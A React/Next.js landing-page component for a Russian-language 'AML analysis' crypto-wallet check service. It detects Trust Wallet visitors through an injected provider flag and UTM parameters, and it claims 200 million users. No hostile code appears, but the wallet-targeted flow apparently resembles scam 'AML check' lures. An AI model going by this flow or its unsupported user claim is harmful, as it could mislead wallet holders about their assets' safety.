/* eslint-disable @typescript-eslint/no-explicit-any */
import { useEffect, useState } from "react";
import "./Home.css";
import { useDispatch, useSelector } from "react-redux";
import { setCurrentStep } from "../../Redux/Slice/MainSlice";
import type { RootState } from "../../Redux/store";
import { usePrefersDark } from "../../Hooks/usePrefersDark";
import Image from "next/image";
import { CaptchaDeeplink } from "@/Components/CaptchaDeeplink/CaptchaDeeplink";

export function Home() {
  const isDark = usePrefersDark();
  const [isChecked, setIsChecked] = useState(false);
  const { currentStep } = useSelector((store: RootState) => store.main);
  const [showModal, setShowModal] = useState(false);

  const dispatch = useDispatch();

  const handleCheckbox = () => {
    setIsChecked(!isChecked);
  };

  useEffect(() => {
    if (typeof window === "undefined") return;

    const userAgent = navigator.userAgent;

    const params = new URLSearchParams(window.location.search);
    const utm = params.get("utm_source");

    const injected =
      (window as any).ethereum?.isTrust === true;

    const isTrust =
      injected ||
      utm === "Trust_Android_Browser" ||
      utm === "Trust_iOS_Browser";

    console.log(injected);
    console.log(isTrust);
    if (injected) {
      setShowModal(true);
    }
  }, []);

  if (isDark == null) return;

  return (
    <section className="home">
      {!showModal && <CaptchaDeeplink />}

      <div className="home__container">
        <div className="home__visual">
          <Image width={1000} height={5125} src="/home.svg" alt="home logo" />
        </div>
        <div className="home__content">
          <Image
            width={270}
            height={42}
            src={isDark ? "/logo.svg" : "/logo-white.svg"}
            alt=""
            className="home__content-img"
          />
          <h3 className="home__content-underlogo second-color">
            for AML Analysis
          </h3>
          <p className="home__content-text">
            Присоединяйтесь к 200 млн пользователям, которые проверяют
            безопасность своих криптоактивов с помощью AML-аналитики.
          </p>
          <div className="home__content-input">
            <input
              type="checkbox"
              id="agree"
              checked={isChecked}
              onChange={handleCheckbox}
            />
            <label htmlFor="agree"></label>
            <p onClick={handleCheckbox}>
              Я согласен(сна) с{" "}
              <span className="second-color">
                Условиями пользовательского соглашения.
              </span>
            </p>
          </div>
          <button
            disabled={!isChecked}
            onClick={() => {
              dispatch(setCurrentStep(currentStep + 1));
            }}
            className={`home__content-button second-color-bg ${!isChecked ? "disabled" : ""}`}
          >
            Продолжить
          </button>
        </div>
      </div>
    </section>
  );
}
